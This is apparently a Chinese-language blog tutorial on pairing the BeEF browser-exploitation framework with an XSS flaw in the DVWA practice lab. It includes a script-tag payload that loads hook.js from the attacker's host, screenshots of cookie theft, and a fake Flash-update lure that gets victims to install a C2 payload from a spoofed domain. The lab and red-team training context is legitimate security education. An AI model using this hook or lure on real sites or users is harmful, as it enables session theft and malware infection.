---
layout: post
title:  "XSS和Beef的使用"
categories: Kali Linux
tags: XSS 漏洞
author: Sincere
---



* content
{:toc}








## 准备

Beef是web框架攻击平台。我们可以利用简单的xss漏洞，通过它编写好的JavaScript（hook.js）控制目标的浏览器，然后通过目标的浏览器获取该主机更多详细信息，也可以对内网进一步的扫描

我们需要两台机子

> 攻击机：kali  
> 靶机：DVWA  

## 开始

第一次启动，beef不允许用默认用户名密码的

![图片1.png](https://i.loli.net/2020/02/09/8yj32dYbFDGQTOP.png)

我们要去修改一下 /etc/beef-xss/config.yaml

![图片2.png](https://i.loli.net/2020/02/09/9vgU81tIOZYlWMQ.png)

user和passwd自己改，自己记住就行，重新./beef启动就可以了

可以看到如下界面，两个红框内容都一样进入那个界面都可以，但是构建xss语句时候我们用第二个框内地址

![图片3.png](https://i.loli.net/2020/02/09/ae7DMIHVrY89pj3.png)

打开url进入登录界面登录

![图片4.png](https://i.loli.net/2020/02/09/TtdrHwzUYIFpvsM.png)

登陆进去之后

![图片5.png](https://i.loli.net/2020/02/09/5mJlyd2QDwTHoc8.png)

这个初始界面，建议仔细的看一下，我这里挑几处的说一下

首先是上线和下线，只有目标访问了存在xss攻击界面时候才上线，如果切换界面就视为下线

模块颜色的区分

![图片6.png](https://i.loli.net/2020/02/09/VsbeRMitNyz2kSa.png)

其他的可以自己百度翻译了解一下。

这里我们做一个小例子

上面我们打开时候会生成一个hook.js地址，我们主要目的是要插入这个js代码，让它去触发，我们可以这样写

\<script src=”http://192.168.0.123:3000/hook.js”></script>

当然xss的payload要根据是否存在waf做相应的绕过，核心就是加载该hook.js代码

这里我们就用dvwa靶场来演示

![图片7.png](https://i.loli.net/2020/02/09/lAe2CQBik3R9Edf.png)

点击留言时候，我们可以返回kali的beef，发现已经上线了

![图片8.png](https://i.loli.net/2020/02/09/pQEu1LqN5Y8TZF4.png)

这里有很多模块，我们可以用

![图片9.png](https://i.loli.net/2020/02/09/kRsJ6IXAon82TDG.png)

我用一个简单的模块，获取对方的cookie

![图片10.png](https://i.loli.net/2020/02/09/KrbI8iBqYt6XCaN.png)

也可以用一下弹窗模块

![图片11.png](https://i.loli.net/2020/02/09/be1hu7cD6qSaOMf.png)

![图片12.png](https://i.loli.net/2020/02/09/lzhjdncBD3xXK4P.png)

下面讲一下护网中我用的比较多的一个模块

![图片13.png](https://i.loli.net/2020/02/09/1gBmC6ekKrT7RqW.png)

这里就是让目标弹出一个flash更新提示，然后我们可以把c2生成的码放在公网上，然后填在custom payload url这里，域名可以自己伪造一下，对方只要安装，你这边c2就可以上线了，这是我在护网中用的比较多的方法，当然还有更多思路
